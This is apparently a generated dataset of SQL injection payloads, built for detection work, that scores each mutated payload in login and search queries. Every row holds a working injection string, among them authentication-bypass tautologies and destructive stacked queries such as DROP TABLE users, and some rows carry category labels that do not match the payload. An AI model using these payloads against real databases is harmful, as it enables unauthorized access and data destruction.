query_id,seed_payload,payload,full_query,llm_attack_category,template_context,label,mutation_count,codebert_score,ast_is_valid,ast_dialect,ast_node_set,sandbox_executed,sandbox_detection_mode,sandbox_exploit_type,judge_malicious_intent_preserved,judge_realistic_for_context,judge_non_trivial_mutation,judge_overall_quality_score,judge_keep,judge_reason,backend,status
q00000,,"--"" OR 'x' = 'x'","SELECT * FROM users WHERE username = '--"" OR 'x' = 'x'' AND password = 'anything'",tautology,login,1,0,0.0,True,default,[],True,complete_query,comment_obfuscation,True,True,True,4,True,"The candidate payload is a tautology attack in the login context, demonstrates non-trivial mutation from the seed, and is realistic for the login scenario.",ollama_local+rules,ok
q00001,,"admin' --""","SELECT * FROM users WHERE username = 'admin' --""' AND password = 'anything'",tautology,login,1,0,0.0,True,default,"[""EQ"", ""Literal"", ""Select"", ""Identifier"", ""Where"", ""From"", ""Table"", ""Star"", ""Column""]",True,payload_fragment,comment_obfuscation,True,True,True,4,True,"The candidate payload is a tautology attack in the login context, demonstrates non-trivial mutation from the seed, and is realistic for the login scenario.",ollama_local+rules,ok
q00002,,"; DROP TABLE users;--""","SELECT * FROM users WHERE username = '; DROP TABLE users;--""' AND password = 'anything'",tautology,login,1,0,0.0,True,default,"[""Table"", ""Identifier"", ""Semicolon"", ""Drop""]",True,complete_query,comment_obfuscation,True,True,True,4,True,"The candidate payload contains a tautology attack pattern that is realistic for the login context, with a non-trivial mutation from the seed payload.",ollama_local+rules,ok
q00003,,"OR '1'='1'""","SELECT * FROM users WHERE username = 'OR '1'='1'""' AND password = 'anything'",tautology,login,1,0,0.0,True,default,"[""Or"", ""EQ"", ""Literal"", ""Select"", ""Identifier"", ""Where"", ""From"", ""Table"", ""Star""]",True,payload_fragment,tautology,True,True,True,4,True,The candidate payload is a tautology attack that is realistic for the login context and shows non-trivial mutation from the seed.,ollama_local+rules,ok
q00005,,"--'\"" OR 'a'='a""","SELECT * FROM users WHERE username = '--'\"" OR 'a'='a""' AND password = 'anything'",tautology,login,1,0,0.0,True,default,[],True,complete_query,comment_obfuscation,True,True,True,4,True,"The candidate payload is a tautology attack in the login context, shows non-trivial mutation from the seed, and is realistic for the login scenario.",ollama_local+rules,ok
q00006,,";/**/SELECT/**/*/**/FROM/**/users/**/WHERE/**/username/**=/\'admin\'/**/AND/**/password/**/=\'anything\'/**/--""","SELECT * FROM users WHERE username = ';/**/SELECT/**/*/**/FROM/**/users/**/WHERE/**/username/**=/\'admin\'/**/AND/**/password/**/=\'anything\'/**/--""' AND password = 'anything'",tautology,login,1,0,0.0,True,mysql,"[""EQ"", ""Literal"", ""Select"", ""Identifier"", ""Where"", ""From"", ""Table"", ""Star"", ""Column""]",True,payload_fragment,stacked_queries,True,True,True,4,True,"The candidate payload maintains malicious intent by embedding a tautology attack in the login context, is realistic, and shows non-trivial mutation from the seed payload.",ollama_local+rules,ok
q00008,,";//DROP TABLE users;//'""","SELECT * FROM users WHERE username = ';//DROP TABLE users;//'""' AND password = 'anything'",tautology,login,1,0,0.0,True,default,"[""EQ"", ""Literal"", ""Select"", ""Identifier"", ""Where"", ""From"", ""Table"", ""Star"", ""Column""]",True,payload_fragment,stacked_queries,True,True,True,4,True,"The candidate payload is a tautology attack in the login context, demonstrates non-trivial mutation from the seed, and is realistic for the login scenario.",ollama_local+rules,ok
q00009,,1' OR CAST(CHAR(1) AS BINARY) COLLATE utf8mb4_bin = CHAR(1),SELECT * FROM users WHERE username = '1' OR CAST(CHAR(1) AS BINARY) COLLATE utf8mb4_bin = CHAR(1)' AND password = 'anything',tautology,login,1,0,0.0,True,default,"[""Or"", ""Collate"", ""EQ"", ""Var"", ""Literal"", ""Select"", ""Identifier"", ""Where"", ""Chr"", ""From"", ""Table"", ""Cast"", ""Star"", ""DataType"", ""Column""]",True,payload_fragment,blind_time,True,True,True,4,True,"The candidate payload is a tautology attack that is realistic for the login context, shows non-trivial mutation from the seed, and maintains malicious intent.",ollama_local+rules,ok
q00011,,%' OR '1'='1,SELECT * FROM products WHERE name LIKE '%%' OR '1'='1%',tautology,search,1,0,0.0,True,default,"[""Or"", ""EQ"", ""Literal"", ""Select"", ""Identifier"", ""Where"", ""From"", ""Table"", ""Star"", ""Column""]",True,payload_fragment,tautology,True,True,True,4,True,The candidate payload is a tautology (OR '1'='1) that is realistic for the search context and represents a non-trivial mutation from the seed payload.,ollama_local+rules,ok
q00012,,;/*',SELECT * FROM products WHERE name LIKE '%;/*'%',tautology,search,1,0,0.0,True,default,"[""EQ"", ""Literal"", ""Select"", ""Identifier"", ""Where"", ""From"", ""Table"", ""Star"", ""Column""]",True,payload_fragment,blind_boolean,True,True,True,4,True,"The candidate payload contains a tautology attack pattern that is plausible for the search context, with a non-trivial mutation from the seed payload, and meets all quality criteria.",ollama_local+rules,ok
q00013,,--%') OR (1=1,SELECT * FROM products WHERE name LIKE '%--%') OR (1=1%',tautology,search,1,0,0.0,True,default,[],True,complete_query,comment_obfuscation,True,True,True,4,True,The candidate payload is a tautology (a trivial SQL injection attack) that is still relevant in the search context and shows non-trivial mutation from the seed.,ollama_local+rules,ok
q00014,,' OR 1=1 --,SELECT * FROM products WHERE name LIKE '%' OR 1=1 --%',tautology,search,1,0,0.0,True,default,"[""Or"", ""EQ"", ""Literal"", ""Select"", ""Identifier"", ""Where"", ""From"", ""Table"", ""Star"", ""Column""]",True,payload_fragment,tautology,True,True,True,4,True,The candidate payload is a tautology attack that is realistic for the search context and represents a non-trivial mutation from the seed payload.,ollama_local+rules,ok
q00016,,/*' OR */1=1--,SELECT * FROM products WHERE name LIKE '%/*' OR */1=1--%',tautology,search,1,0,0.0,True,default,"[""EQ"", ""Literal""]",True,complete_query,blind_boolean,True,True,True,4,True,"The candidate payload is a tautology attack in the search context, with non-trivial mutation and realistic for the context.",ollama_local+rules,ok
